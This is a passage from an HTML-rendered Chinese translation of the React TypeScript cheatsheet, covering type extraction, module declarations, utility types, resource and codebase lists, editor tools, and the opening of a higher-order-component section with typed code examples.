class="hljs-string">&quot;library&quot;</span>; <span class="hljs-comment">// but doesn&#x27;t export ButtonProps! oh no!</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ButtonProps</span> = <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentProps</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Button</span>&gt;; <span class="hljs-comment">// no problem! grab your own!</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">AlertButtonProps</span> = <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">ButtonProps</span>, <span class="hljs-string">&quot;onClick&quot;</span>&gt;; <span class="hljs-comment">// modify</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">AlertButton</span> = (<span class="hljs-params">props: AlertButtonProps</span>) =&gt; (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> alert(&quot;hello&quot;)&#125; &#123;...props&#125; /&gt;</span><br>);<br></code></pre></td></tr></table></figure><p>您还可以使用<a href="https://github.com/DefinitelyTyped/DefinitelyTyped/blob/a05cc538a42243c632f054e42eab483ebf1560ab/types/react/index.d.ts#L774"><code>ComponentPropsWithoutRef</code></a>（而不是 ComponentProps）和<a href="https://github.com/DefinitelyTyped/DefinitelyTyped/blob/a05cc538a42243c632f054e42eab483ebf1560ab/types/react/index.d.ts#L770"><code>ComponentPropsWithRef</code></a>（如果您的组件专门转发引用）</p><ul><li>获取函数的返回类型：使用<code>ReturnType</code>：</li></ul><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// inside some library - return type &#123; baz: number &#125; is inferred but not exported</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">bar: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">baz</span>: <span class="hljs-number">1</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">//  inside your app, if you need &#123; baz: number &#125;</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">FooReturn</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> foo&gt;; <span class="hljs-comment">// &#123; baz: number &#125;</span><br></code></pre></td></tr></table></figure><p>事实上，您几乎可以获取任何公开的东西：<a href="http://ikoshelev.azurewebsites.net/search/id/11/Pragmatic-uses-of-TypeScript-type-system-My-type-of-type">请参阅 Ivan Koshelev 的这篇博文</a></p><h4 id="我需要的类型不存在"><a href="#我需要的类型不存在" class="headerlink" title="我需要的类型不存在"></a>我需要的类型不存在</h4><p>一种<strong>更懒惰的</strong>方法是创建一个新的类型声明文件，例如<code>typedec.d.ts</code>– 如果您还没有一个。通过检查目录根目录下文件<code>include</code>中的数组，确保 TypeScript 可解析文件路径。<code>tsconfig.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// inside tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-string">&quot;src&quot;</span> <span class="hljs-comment">// automatically resolves if the path to declaration is src/typedec.d.ts</span><br>  <span class="hljs-punctuation">]</span><br>  <span class="hljs-comment">// ...</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在此文件中，将<code>declare</code>所需模块的语法添加<code>my-untyped-module</code>到声明文件中：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-comment">// inside typedec.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&quot;my-untyped-module&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果您只需要它能够无错误地工作，那么单单这一行就足够了。一种更黑客的、写一次就忘记的方法是使用，<code>&quot;*&quot;</code>然后将<code>Any</code>类型应用于所有现有和未来的非类型化模块。</p><p>如果您的非类型化模块少于几个，则此解决方案可以作为一种很好的解决方法。更重要的是，你现在手里有一枚滴答作响的炸弹。避免此问题的唯一方法是为那些无类型模块定义缺失的类型，如以下各节所述。</p><h4 id="自动生成类型"><a href="#自动生成类型" class="headerlink" title="自动生成类型"></a>自动生成<a href="https://react-typescript-cheatsheet.netlify.app/docs/basic/troubleshooting/types#autogenerate-types">类型</a></h4><p>您可以将 TypeScript 与<code>--allowJs</code>和结合使用<code>--declaration</code>，以查看 TypeScript 对库类型的“最佳猜测”。</p><p>如果这还不够好，请<a href="https://github.com/Microsoft/dts-gen"><code>dts-gen</code></a>使用对象的运行时形状来准确枚举所有可用属性。这往往非常准确，但该工具尚不支持抓取 JSDoc 注释来填充其他类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g dts-gen<br>dts-gen -m &lt;your-module&gt;<br></code></pre></td></tr></table></figure><p>还有其他自动化 JS 到 TS 转换工具和迁移策略 - 请参阅<a href="https://react-typescript-cheatsheet.netlify.app/docs/migration/from_js">我们的迁移备忘单</a>。</p><h4 id="键入导出的Hook"><a href="#键入导出的Hook" class="headerlink" title="键入导出的Hook"></a>键入导出的<a href="https://react-typescript-cheatsheet.netlify.app/docs/basic/troubleshooting/types#typing-exported-hooks">Hook</a></h4><p>输入 Hooks 就像输入纯函数一样。</p><p>以下步骤在两个假设下有效：</p><ul><li>您已经创建了一个类型声明文件，如本节前面所述。</li><li>您可以访问源代码 - 特别是直接导出您将使用的函数的代码。在大多数情况下，它会保存在一个<code>index.js</code>文件中。通常，您至少需要<strong>两个</strong>类型声明（一个用于<strong>Input Prop</strong>，另一个用于<strong>Return Prop</strong>）才能完整定义钩子。假设您要输入的钩子遵循以下结构，</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">useUntypedHook</span> = (<span class="hljs-params">prop</span>) =&gt; &#123;<br>  <span class="hljs-comment">// some processing happens here</span><br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-comment">/* ReturnProps */</span><br>  &#125;;<br>&#125;;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useUntypedHook;<br></code></pre></td></tr></table></figure><p>那么，您的类型声明很可能应该遵循以下语法。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;use-untyped-hook&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">InputProps</span> &#123; ... &#125;   <span class="hljs-comment">// type declaration for prop</span><br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ReturnProps</span> &#123; ... &#125; <span class="hljs-comment">// type declaration for return props</span><br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useUntypedHook</span>(<span class="hljs-params"></span><br><span class="hljs-params">    prop: InputProps</span><br><span class="hljs-params">    <span class="hljs-comment">// ...</span></span><br><span class="hljs-params">  </span>): <span class="hljs-title class_">ReturnProps</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8、Operators"><a href="#8、Operators" class="headerlink" title="8、Operators"></a>8、Operators</h3><ul><li><code>typeof</code>and <code>instanceof</code>：输入用于细化的查询</li><li><code>keyof</code>：获取对象的键。<code>keyof T</code>：是一个运算符，告诉您k的值可用于哪些用途</li><li><code>O[K]</code>：属性查找</li><li><code>[K in O]</code>: 映射类型</li><li><code>+</code>or <code>-</code>or <code>readonly</code>or <code>?</code>：加法和减法以及只读和可选修饰符</li><li><code>x ? Y : Z</code>：泛型类型、类型别名、函数参数类型的条件类型</li><li><code>!</code>：可空类型的非空断言</li><li><code>=</code>：泛型类型参数默认的泛型类型</li><li><code>as</code>: 类型断言</li><li><code>is</code>：函数返回类型的类型保护</li></ul><h3 id="9、Utilitie"><a href="#9、Utilitie" class="headerlink" title="9、Utilitie"></a>9、Utilitie</h3><ul><li><code>Awaited</code>: 模仿的行为<code>await</code></li><li><code>Capitalize</code>：将字符串文字类型的第一个字符转换为大写</li><li><code>ConstructorParameters</code>：类构造函数参数类型的元组</li><li><code>Exclude</code>：从一种类型中排除另一种类型</li><li><code>Extract</code>：选择可分配给其他类型的子类型</li><li><code>InstanceType``new</code>：从类构造函数中获取的实例类型</li><li><code>Lowercase</code>：将字符串文字类型转换为小写</li><li><code>NonNullable</code>:从类型中排除<code>null</code>and<code>undefined</code></li><li><code>Omit</code>：用另一种类型的属性构造一个类型。</li><li><code>OmitThisParameter</code>：从函数类型中删除“this”参数。</li><li><code>Parameters</code>：函数参数类型的元组</li><li><code>Partial</code>：使对象中的所有属性可选</li><li><code>Readonly</code>：使对象中的所有属性只读</li><li><code>ReadonlyArray</code>：创建给定类型的不可变数组</li><li><code>Pick</code>：对象类型的子类型及其键的子集</li><li><code>Record</code>：从键类型到值类型的映射</li><li><code>Required</code>：使对象中的所有属性成为必需</li><li><code>ReturnType</code>: 函数的返回类型</li><li><code>ThisParameterType</code>：提取函数类型的“this”参数的类型</li><li><code>ThisType</code>：上下文“this”类型的标记</li><li><code>Uncapitalize</code>：将字符串文字类型的第一个字符转换为小写</li><li><code>Uppercase</code>：将字符串文字类型转换为大写</li></ul><h3 id="10、是时候真正学习-TypeScript-了"><a href="#10、是时候真正学习-TypeScript-了" class="headerlink" title="10、是时候真正学习 TypeScript 了"></a>10、是时候真正学习 TypeScript 了</h3><p>不管你相信与否，我们在这份备忘单中只是勉强介绍了 TypeScript。如果你仍然面临 TypeScript 故障排除问题，很可能你对 TS 的理解仍然太肤浅。</p><p>您最终将进入一个泛型类型逻辑的世界，但是它远不如处理 React 而是擅长 TypeScript，所以它超出了这里的范围。但至少你现在可以在 React 中提高工作效率了:)</p><p>值得一提的是一些可以帮助您入门的资源：</p><ul><li>逐步浏览由 @Orta 编写的<a href="http://www.typescriptlang.org/play/index.html">Playground</a>示例部分中的 40 多个示例</li><li>Anders Hejlsberg 对 TS 的概述：<a href="https://www.youtube.com/watch?v=ET4kT88JRXs">https://www.youtube.com/watch? v=ET4kT88JRXs</a></li><li>Marius Schultz：<a href="https://blog.mariusschulz.com/series/typescript-evolution%E4%BB%A5%E5%8F%8A[Egghead.io">https://blog.mariusschulz.com/series/typescript-evolution以及[Egghead.io</a> 课程](<a href="https://egghead.io/courses/advanced-static-types-in-typescript">https://egghead.io/courses/advanced-static-types-in-typescript</a>)</li><li>Basarat 的深入研究：<a href="https://basarat.gitbook.io/typescript/">https://basarat.gitbook.io/typescript/</a></li><li>Axel Rauschmeyer<a href="https://exploringjs.com/tackling-ts/">应对 TypeScript</a></li><li>Rares Matei：<a href="https://egghead.io/courses/practical-advanced-typescript">Egghead.io 课程</a>Egghead.io 上的高级 TypeScript 课程非常适合较新的 TypeScript 功能和实用的类型逻辑应用（例如递归地生成类型的所有属性<code>readonly</code>）</li><li>了解<a href="https://www.youtube.com/watch?v=PJjeHzvi_VQ&feature=youtu.be">泛型、条件类型和映射类型</a></li><li>Shu Uesugi：<a href="https://ts.chibicode.com/">面向初学者程序员的 TypeScript</a></li><li>这是另一个<a href="https://github.com/threehams/typescript-error-guide/">TypeScript 错误指南</a>，您可以检查错误。</li></ul><h3 id="11、推荐学习的-React-TypeScript-代码库"><a href="#11、推荐学习的-React-TypeScript-代码库" class="headerlink" title="11、推荐学习的 React + TypeScript 代码库"></a>11、推荐学习的 React + TypeScript 代码库</h3><ul><li>应用<ul><li><a href="https://github.com/devhubapp/devhub">https://github.com/devhubapp/devhub</a></li><li><a href="https://github.com/benawad/codeponder%EF%BC%88%E5%B8%A6%E6%9C%89[%E7%BC%96%E7%A0%81%E7%9B%B4%E6%92%AD%EF%BC%81](https://www.youtube.com/watch?v=D8IJOwdNSkc&amp;list=PLN3n1USn4xlnI6kwzI8WrNgSdG4Z6daCq)%EF%BC%89">https://github.com/benawad/codeponder（带有[编码直播！](https://www.youtube.com/watch?v=D8IJOwdNSkc&amp;list=PLN3n1USn4xlnI6kwzI8WrNgSdG4Z6daCq)）</a></li><li><a href="https://github.com/cypress-io/cypress-realworld-app">https://github.com/cypress-io/cypress-realworld-app</a></li><li><a href="https://github.com/alan2207/bulletproof-react">https://github.com/alan2207/bulletproof-react</a></li></ul></li><li>设计系统&#x2F;组件库<ul><li><a href="https://github.com/seek-oss/braid-design-system/%EF%BC%88%E6%9F%A5%E7%9C%8B[%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8">https://github.com/seek-oss/braid-design-system/（查看[如何使用</a> TS 验证 props](<a href="https://twitter.com/markdalgleish/status/1339863859469955072?s=20)%EF%BC%89">https://twitter.com/markdalgleish/status/1339863859469955072?s=20)）</a></li><li><a href="https://github.com/palantir/blueprint">https://github.com/palantir/blueprint</a></li><li><a href="https://github.com/Shopify/polaris">https://github.com/Shopify/polaris</a></li><li><a href="https://github.com/microsoft/fluentui">https://github.com/microsoft/fluentui</a></li></ul></li><li>图书馆<ul><li><a href="https://github.com/formium/formik/">https://github.com/formium/formik/</a></li><li><a href="https://github.com/jaredpalmer/react-fns">https://github.com/jaredpalmer/react-fns</a></li></ul></li><li>杂项<ul><li><a href="https://github.com/NullVoxPopuli/react-vs-ember/tree/master/testing/react">https://github.com/NullVoxPopuli/react-vs-ember/tree/master/testing/react</a></li><li><a href="https://github.com/artsy/reaction">https://github.com/artsy/reaction</a></li><li><a href="https://github.com/artsy/emission">https://github.com/artsy/emission（React</a> Native）</li><li><a href="https://github.com/reach/reach-ui/pull/105">@reach&#x2F;ui 的社区类型</a></li><li><a href="https://github.com/pshrmn/curi/tree/master/packages/router">https://github.com/pshrmn/curi/tree/master/packages/router</a></li></ul></li></ul><p>较旧但仍然值得检查：</p><ul><li><a href="https://bitbucket.org/atlassian/atlaskit-mk-2/src/master/">https://bitbucket.org/atlassian/atlaskit-mk-2/src/master/</a></li><li><a href="https://github.com/contiamo/operational-ui">https://github.com/contiamo/operational-ui</a></li></ul><p>反应样板：</p><ul><li><a href="https://github.com/rwieruch/nextjs-firebase-authentication%EF%BC%9ANext.js">https://github.com/rwieruch/nextjs-firebase-authentication：Next.js</a> + Firebase Starter：样式化、测试、键入和身份验证</li><li><a href="https://github.com/jpavon/react-scripts-ts">@jpavon&#x2F;react-scripts-ts使用</a><a href="https://github.com/TypeStrong/ts-loader">ts-loader</a>具有所有 TypeScript 功能的替代反应脚本</li><li><a href="https://webpack.jakoblind.no/">webpack 配置工具</a>是一个可视化工具，用于使用 React 和 TypeScript 创建 webpack 项目</li><li><a href="https://github.com/innFactory/create-react-app-material-typescript-redux%E5%87%86%E5%A4%87%E5%A5%BD%E4%BD%BF%E7%94%A8[Material-UI](https://material-ui.com/)%E3%80%81%E8%B7%AF%E7%94%B1%E5%92%8C">https://github.com/innFactory/create-react-app-material-typescript-redux准备好使用[Material-UI](https://material-ui.com/)、路由和</a> Redux 的模板</li></ul><p>React Native Boilerplates：由*<a href="https://github.com/typescript-cheatsheets/react/pull/20">@spoeck</a>*<em>贡献</em></p><ul><li><a href="https://github.com/GeekyAnts/react-native-seed">https://github.com/GeekyAnts/react-native-seed</a></li><li><a href="https://github.com/lopezjurip/ReactNativeTS">https://github.com/lopezjurip/ReactNativeTS</a></li><li><a href="https://github.com/emin93/react-native-template-typescript">https://github.com/emin93/react-native-template-typescript</a></li><li><a href="https://github.com/Microsoft/TypeScript-React-Native-Starter">https://github.com/Microsoft/TypeScript-React-Native-Starter</a></li></ul><p>待研究的 TS 库代码库</p><ul><li><a href="https://github.com/Azure/azure-sdk-for-js">https://github.com/Azure/azure-sdk-for-js</a></li><li><a href="https://github.com/sindresorhus/is">https://github.com/sindresorhus/is</a></li><li><a href="https://github.com/probot/probot">https://github.com/probot/probot</a></li><li><a href="https://github.com/intuit/auto">https://github.com/intuit/auto</a></li><li><a href="https://github.com/polymer/tools">https://github.com/polymer/tools</a></li><li><a href="https://github.com/nteract/nteract">https://github.com/nteract/nteract</a></li><li><a href="https://github.com/pgilad/leasot">https://github.com/pgilad/leasot</a></li><li><a href="https://github.com/JasonEtco/actions-toolkit">https://github.com/JasonEtco/actions-toolkit</a></li><li><a href="https://github.com/ferdaber/typescript-bootstrap/">https://github.com/ferdaber/typescript-bootstrap/</a></li><li><a href="https://github.com/contiamo/operational-scripts">https://github.com/contiamo/operational-scripts</a></li><li><a href="https://github.com/nobrainr/morphism">https://github.com/nobrainr/morphism</a></li><li><a href="https://github.com/slackapi/node-slack-sdk">https://github.com/slackapi/node-slack-sdk</a></li></ul><h3 id="12、编辑器工具和集成"><a href="#12、编辑器工具和集成" class="headerlink" title="12、编辑器工具和集成"></a>12、编辑器工具和集成</h3><ul><li>VS代码<ul><li>swyx 的 VSCode 扩展：<a href="https://github.com/sw-yx/swyx-react-typescript-snippets">https://github.com/sw-yx/swyx-react-typescript-snippets</a></li><li>amVim：<a href="https://marketplace.visualstudio.com/items?itemName=auiworks.amvim">https://marketplace.visualstudio.com/items? itemName=auiworks.amvim</a></li></ul></li><li>为什么<ul><li><a href="https://github.com/Quramy/tsuquyomi">https://github.com/Quramy/tsuquyomi</a></li><li>nvim 打字稿？</li><li><a href="https://github.com/leafgarland/typescript-vim">https://github.com/leafgarland/typescript-vim</a></li><li>peitalin&#x2F;vim-jsx-typescript</li><li>NeoVim： https: <a href="https://github.com/neoclide/coc.nvim">&#x2F;&#x2F;github.com&#x2F;neoclide&#x2F;coc.nvim</a></li><li>其他讨论：<a href="https://mobile.twitter.com/ryanflorence/status/1085715595994095620">https://mobile.twitter.com/ryanflorence/status/1085715595994095620</a></li></ul></li></ul><h1 id="HOC-备忘单"><a href="#HOC-备忘单" class="headerlink" title="HOC 备忘单"></a>HOC 备忘单</h1><h3 id="1、基本HOC示例"><a href="#1、基本HOC示例" class="headerlink" title="1、基本HOC示例"></a>1、基本HOC示例</h3><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">PropsAreEqual</span>&lt;P&gt; = <span class="hljs-function">(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  prevProps: Readonly&lt;P&gt;,</span></span><br><span class="hljs-params"><span class="hljs-function">  nextProps: Readonly&lt;P&gt;</span></span><br><span class="hljs-params"><span class="hljs-function"></span>) =&gt;</span> <span class="hljs-built_in">boolean</span>;<br><br><span class="hljs-keyword">const</span> withSampleHoC = &lt;P <span class="hljs-keyword">extends</span> &#123;&#125;&gt;(<br>  <span class="hljs-attr">component</span>: &#123;<br>    (<span class="hljs-attr">props</span>: P): <span class="hljs-title class_">Exclude</span>&lt;<span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>, <span class="hljs-literal">undefined</span>&gt;;<br>    displayName?: <span class="hljs-built_in">string</span>;<br>  &#125;,<br>  propsAreEqual?: <span class="hljs-title class_">PropsAreEqual</span>&lt;P&gt; | <span class="hljs-literal">false</span>,<br><br>  componentName = component.<span class="hljs-property">displayName</span> ?? component.<span class="hljs-property">name</span><br>): &#123;<br>  (<span class="hljs-attr">props</span>: P): <span class="hljs-variable constant_">JSX</span>.<span class="hljs-property">Element</span>;<br>  <span class="hljs-attr">displayName</span>: <span class="hljs-built_in">string</span>;<br>&#125; =&gt; &#123;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">WithSampleHoc</span>(<span class="hljs-params">props: P</span>) &#123;<br>    <span class="hljs-comment">//Do something special to justify the HoC.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">component</span>(props) <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">JSX</span>.<span class="hljs-property">Element</span>;<br>  &#125;<br><br>  <span class="hljs-title class_">WithSampleHoc</span>.<span class="hljs-property">displayName</span> = <span class="hljs-string">`withSampleHoC(<span class="hljs-subst">$&#123;componentName&#125;</span>)`</span>;<br><br>  <span class="hljs-keyword">let</span> wrappedComponent = propsAreEqual === <span class="hljs-literal">false</span> ? <span class="hljs-title class_">WithSampleHoc</span> : <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-title class_">WithSampleHoc</span>, propsAreEqual);<br><br>  <span class="hljs-comment">//copyStaticProperties(component, wrappedComponent);</span><br><br>  <span class="hljs-keyword">return</span> wrappedComponent <span class="hljs-keyword">as</span> <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">WithSampleHoc</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>此代码满足以下条件：</p><ol><li>允许组件返回有效元素 ( <code>strings | array | boolean | null | number</code>) 而不仅仅是<code>JSX.Element | null</code>.</li><li>除非您选择退出，否则将其包含在备忘录中。</li><li>删除嵌套组件，因此 React Dev 工具将仅显示一个组件。</li><li><code>displayName</code>在 React Dev Tool 中用注释指示这是一个封装在两个 HoC 中的组件</li><li>可选：复制可能已在原始组件上定义的静态属性。</li></ol><h3 id="2、完整HOC示例"><a href="#2、完整HOC示例" class="headerlink" title="2、完整HOC示例"></a>2、完整HOC示例</h3><p><strong>注入的道具</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">WithThemeProps</span> &#123;<br>  <span class="hljs-attr">primaryColor</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在组件中的使用</strong></p><p>目标是在组件的界面上提供可用的 props，但在封装在 HoC 中时为组件的使用者减去这些 props。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Props</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WithThemeProps</span> &#123;<br>  children?: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyButton</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span>&lt;<span class="hljs-title class_">Props</span>&gt; &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Render an the element using the theme and other props.</span><br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-title function_">someInternalMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// The theme values are also available as props here.</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">withTheme</span>(<span class="hljs-title class_">MyButton</span>);<br></code></pre></td></tr></table></figure><p><strong>使用组件</strong></p><p>现在，在使用组件时，您可以省略该<code>primaryColor</code>prop 或覆盖通过上下文提供的 prop。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tsx">&lt;<span class="hljs-title class_">MyButton</span>&gt;<span class="hljs-title class_">Hello</span> button&lt;<span class="hljs-regexp">/MyButton&gt; /</span><span class="hljs-regexp">/ Valid</span><br><span class="hljs-regexp">&lt;MyButton primaryColor=&quot;#333&quot;&gt;Hello Button&lt;/</span><span class="hljs-title class_">MyButton</span>&gt; <span class="hljs-comment">// Also valid</span><br></code></pre></td></tr></table></figure><p><strong>声明 HoC</strong></p><p>实际的HoC。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> withTheme&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WithThemeProps</span> = <span class="hljs-title class_">WithThemeProps</span>&gt;(<br>  <span class="hljs-title class_">WrappedComponent</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentType</span>&lt;T&gt;<br>) &#123;<br>  <span class="hljs-comment">// Try to create a nice displayName for React Dev Tools.</span><br>  <span class="hljs-keyword">const</span> displayName =<br>    <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">displayName</span> || <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span> || <span class="hljs-string">&quot;Component&quot;</span>;<br><br>  <span class="hljs-comment">// Creating the inner component. The calculated Props type here is the where the magic happens.</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">ComponentWithTheme</span> = (<span class="hljs-params">props: Omit&lt;T, keyof WithThemeProps&gt;</span>) =&gt; &#123;<br>    <span class="hljs-comment">// Fetch the props you want to inject. This could be done with context instead.</span><br>    <span class="hljs-keyword">const</span> themeProps = <span class="hljs-title function_">useTheme</span>();<br><br>    <span class="hljs-comment">// props comes afterwards so the can override the default ones.</span><br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...themeProps</span>&#125; &#123;<span class="hljs-attr">...</span>(<span class="hljs-attr">props</span> <span class="hljs-attr">as</span> <span class="hljs-attr">T</span>)&#125; /&gt;</span></span>;<br>  &#125;;<br><br>  <span class="hljs-title class_">ComponentWithTheme</span>.<span class="hljs-property">displayName</span> = <span class="hljs-string">`withTheme(<span class="hljs-subst">$&#123;displayName&#125;</span>)`</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentWithTheme</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>请注意，<code>&#123;...(props as T)&#125;</code>由于 TS 3.2 中存在当前错误，因此需要断言<a href="https://github.com/Microsoft/TypeScript/issues/28938#issuecomment-450636046">https://github.com/Microsoft/TypeScript/issues/28938#issuecomment-450636046</a></p><p>这是动态高阶组件的一个更高级的示例，该组件的一些参数基于传入组件的 props：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-comment">// inject static values to a component so that they&#x27;re always provided</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> inject&lt;<span class="hljs-title class_">TProps</span>, <span class="hljs-title class_">TInjectedKeys</span> <span class="hljs-keyword">extends</span> keyof <span class="hljs-title class_">TProps</span>&gt;(<br>  <span class="hljs-title class_">Component</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">JSXElementConstructor</span>&lt;<span class="hljs-title class_">TProps</span>&gt;,<br>  <span class="hljs-attr">injector</span>: <span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">TProps</span>, <span class="hljs-title class_">TInjectedKeys</span>&gt;<br>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Injected</span>(<span class="hljs-params">props: Omit&lt;TProps, TInjectedKeys&gt;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span 